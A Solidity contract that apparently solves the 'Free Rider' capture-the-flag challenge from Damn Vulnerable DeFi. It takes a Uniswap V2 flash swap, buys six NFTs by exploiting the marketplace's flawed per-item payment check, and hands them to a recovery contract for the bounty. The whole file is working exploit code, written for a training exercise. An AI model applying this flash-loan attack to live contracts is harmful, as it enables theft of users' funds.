// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FreeRiderNFTMarketplace} from "../free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecovery} from "../free-rider/FreeRiderRecovery.sol";
import {DamnValuableNFT} from "../DamnValuableNFT.sol";

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";

interface IWETH {
    function deposit() external payable;

    function withdraw(uint256) external;

    function balanceOf(address) external view returns (uint256);

    function transfer(address, uint256) external;
}

contract HackFreeRider is IERC721Receiver {
    address weth;
    address factory;
    address pair;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery recovery;
    uint256 loanAmount;
    uint256 public _fee;

    constructor(
        address _weth,
        address _factory,
        address _pair,
        FreeRiderNFTMarketplace _marketplace,
        FreeRiderRecovery _recovery,
        uint256 _loanAmount
    ) {
        weth = _weth;
        factory = _factory;
        pair = _pair;
        marketplace = _marketplace;
        recovery = _recovery;
        loanAmount = _loanAmount;
    }

    function execute() external {
        uint256 amount0Out;
        uint256 amount1Out;

        IUniswapV2Pair(pair).token0() == weth ? amount0Out = loanAmount : amount1Out = loanAmount;
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(loanAmount));
    }

    function uniswapV2Call(address sender, uint256, uint256, bytes calldata data) external {
        require(sender == address(this));
        require(msg.sender == pair);
        require(abi.decode(data, (uint256)) == loanAmount);
        require(IWETH(weth).balanceOf(address(this)) == loanAmount);

        uint256 fee = ((loanAmount * 3) / 997) + 1;
        _fee = fee;

        IWETH(weth).withdraw(loanAmount);

        uint256[] memory ids = new uint256[](6);
        for (uint256 i = 0; i < ids.length; i++) {
            ids[i] = i;
        }

        marketplace.buyMany{value: loanAmount}(ids);

        DamnValuableNFT nft = marketplace.token();

        for (uint256 i = 0; i < ids.length; i++) {
            nft.safeTransferFrom(address(this), address(recovery), ids[i], abi.encode(tx.origin));
        }

        assert(address(this).balance == 90e18);

        IWETH(weth).deposit{value: loanAmount + fee}();
        IWETH(weth).transfer(msg.sender, loanAmount + fee);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
